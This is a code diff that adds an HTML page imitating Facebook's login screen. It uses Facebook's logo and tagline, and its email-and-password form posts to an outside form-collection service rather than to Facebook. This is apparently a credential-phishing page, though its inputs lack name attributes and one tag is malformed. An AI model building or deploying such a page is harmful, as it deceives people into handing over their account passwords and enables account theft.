@@ -1,0 +1,64 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook Login Page</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+   <div class="container">
+    <div class="wrapper">
+        <div class="brand">
+            <div class="logo">
+                <img
+                    class="img"
+                    src="https://static.xx.fbcdn.net/rsrc.php/y1/r/4lCu2zih0ca.svg"
+                    alt="Facebook"
+                />
+            </div>
+            <h2 class="heading">
+                Facebook helps you connect and share with the people in
+                your life.
+            </h2>
+        </div>
+        <div ">
+            <div class="form-container">
+                <form
+  action="https://submit-form.com/0JDosZ5IE"
+  method="POST"
+>
+                    <div class="form-wrapper">
+                        <input
+                            type="email"
+                            class="inputtext"
+                            placeholder="Email address or phone number"
+                            autofocus="1"
+                        />
+                        <input
+                            type="password"
+                            class="inputtext"
+                            placeholder="Password"
+                        />
+                        <button type="submit">Log in</button>
+
+                        <div class="forgot-password">
+                            <a href="#">Forgotten password?</a>
+                        </div>
+                    </div>
+
+                    <div class="create-account">
+                        <a href="#">Create new account</a>
+                    </div>
+                </form>
+            </div>
+            <div class="create-page">
+                <a href="#">Create a Page</a>
+                for a celebrity, brand or business.
+            </div>
+        </div>
+    </div>
+</div>
+</body>
+</html>
